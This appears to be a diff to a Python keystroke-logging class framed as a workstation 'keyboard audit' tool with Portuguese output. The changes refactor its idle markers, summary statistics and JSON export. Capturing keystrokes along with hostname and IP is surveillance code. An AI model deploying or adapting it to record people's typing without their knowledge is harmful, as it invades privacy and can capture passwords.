@@ -38,7 +38,6 @@ class KeyloggerEngine:
             "enters": 0,
             "top_keys": {},
         }
-        self._idle_marker_written = False
 
         self._lock = threading.Lock()
         self._state_lock = threading.Lock()
@@ -95,7 +94,6 @@ class KeyloggerEngine:
             return
 
         self.last_key_time = time.time()
-        self._idle_marker_written = False
 
         if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
             self.shift_pressed = True
@@ -173,34 +171,15 @@ class KeyloggerEngine:
     def _flush_worker(self):
         while self.is_running:
             time.sleep(self.flush_interval)
-            if not self.is_running:
-                break
 
-            if time.time() - self.last_key_time > 5 and not self._idle_marker_written:
+            if time.time() - self.last_key_time > 5:
                 with self._lock:
-                    self._idle_marker_written = True
                     self._flush_line_buffer()
                     self.buffer += "\n[SESSÃO ENCERRADA - INATIVIDADE]\n"
 
             with self._lock:
                 self._flush_line_buffer()
                 self._flush_buffer()
-
-    def _build_stats_summary_text(self):
-        top_3 = sorted(self.stats["top_keys"].items(), key=lambda item: item[1], reverse=True)[:3]
-        detailed_stats = json.dumps(self.stats, indent=2, ensure_ascii=False)
-        return (
-            "\n\n==========================================================\n"
-            f"FIM DA AUDITORIA    : {datetime.now().strftime('%H:%M:%S')}\n"
-            f"TOTAL DE TECLAS     : {self.stats['total_keys']}\n"
-            f"ENTERS / BACKSPACES : {self.stats['enters']} / {self.stats['backspaces']}\n"
-            f"TECLAS MAIS USADAS  : {top_3}\n"
-            "==========================================================\n"
-            "ESTATISTICAS DETALHADAS\n"
-            "==========================================================\n"
-            f"{detailed_stats}\n"
-            "==========================================================\n"
-        )
 
     def start(self):
         if self.is_running:
@@ -223,11 +202,6 @@ class KeyloggerEngine:
             f"ESTAÇÃO TRABALHO   : {info['hostname']} ({info['ip']})\n"
             f"SISTEMA OPERACIONAL: {info['os']}\n"
             "==========================================================\n\n"
-        )
-
-        header = format_report_header_text(
-            "RELATÓRIO DE AUDITORIA DE TECLADO",
-            self.user_context,
         )
 
         with open(self.log_file, "w", encoding="utf-8") as file_obj:
@@ -254,8 +228,26 @@ class KeyloggerEngine:
 
         with self._lock:
             self._flush_line_buffer()
-            self.buffer += self._build_stats_summary_text()
+
+            top_3 = sorted(self.stats["top_keys"].items(), key=lambda item: item[1], reverse=True)[:3]
+            resumo = (
+                "\n\n==========================================================\n"
+                f"FIM DA AUDITORIA    : {datetime.now().strftime('%H:%M:%S')}\n"
+                f"TOTAL DE TECLAS     : {self.stats['total_keys']}\n"
+                f"ENTERS / BACKSPACES : {self.stats['enters']} / {self.stats['backspaces']}\n"
+                f"TECLAS MAIS USADAS  : {top_3}\n"
+                "==========================================================\n"
+            )
+
+            self.buffer += resumo
             self._flush_buffer()
+
+        json_path = self.log_file.replace(".txt", ".json")
+        try:
+            with open(json_path, "w", encoding="utf-8") as file_obj:
+                json.dump(self.stats, file_obj, indent=4)
+        except Exception as exc:
+            print(f"[Keylogger] erro ao salvar JSON: {exc}")
 
     def get_recent_activity(self, max_chars=1000):
         if not self.log_file or not os.path.exists(self.log_file):
